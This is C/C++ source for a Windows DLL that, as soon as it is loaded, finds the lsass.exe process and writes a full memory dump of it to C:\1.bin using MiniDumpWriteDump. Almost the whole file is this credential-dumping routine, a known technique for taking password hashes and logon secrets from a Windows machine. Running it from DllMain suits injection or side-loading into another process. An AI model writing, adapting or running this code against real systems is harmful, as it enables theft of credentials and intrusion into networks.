#include "pch.h"
#pragma comment(lib,"Dbghelp.lib")


DWORD GetLsassPid() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD dwProcessId = 0;

    do {
        PROCESSENTRY32 pe32 = { sizeof pe32 };
        if (!Process32First(hSnapshot, &pe32))
            break;

        while (Process32Next(hSnapshot, &pe32)) {
            // wprintf(L"%s\n", pe32.szExeFile);
            if (0 == wcscmp(pe32.szExeFile, L"lsass.exe")) {
                dwProcessId = pe32.th32ProcessID;
                break;
            }
            Process32Next(hSnapshot, &pe32);
        }
    } while (FALSE);

    CloseHandle(hSnapshot);
    return dwProcessId;
}

BOOL ProcessDump(DWORD dwProcessId, WCHAR* lpFileName) {
    if (!dwProcessId)
        return;

    HANDLE hProcess = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
        FALSE, dwProcessId
    );
    if (hProcess == NULL) {
        wprintf(L"Couldn't open process: %d\n", GetLastError());
        return FALSE;
    }

    HANDLE hFile = CreateFile(
        lpFileName,
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, CREATE_ALWAYS, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"Couldn't create file: %d\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    if (!MiniDumpWriteDump(
        hProcess, dwProcessId, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL
    )) {
        wprintf(L"Dump error: %u\n", GetLastError());
        CloseHandle(hProcess);
        CloseHandle(hFile);
        return FALSE;
    }

    CloseHandle(hProcess);
    CloseHandle(hFile);
    return TRUE;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        ProcessDump(GetLsassPid(), L"C:\\1.bin");
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
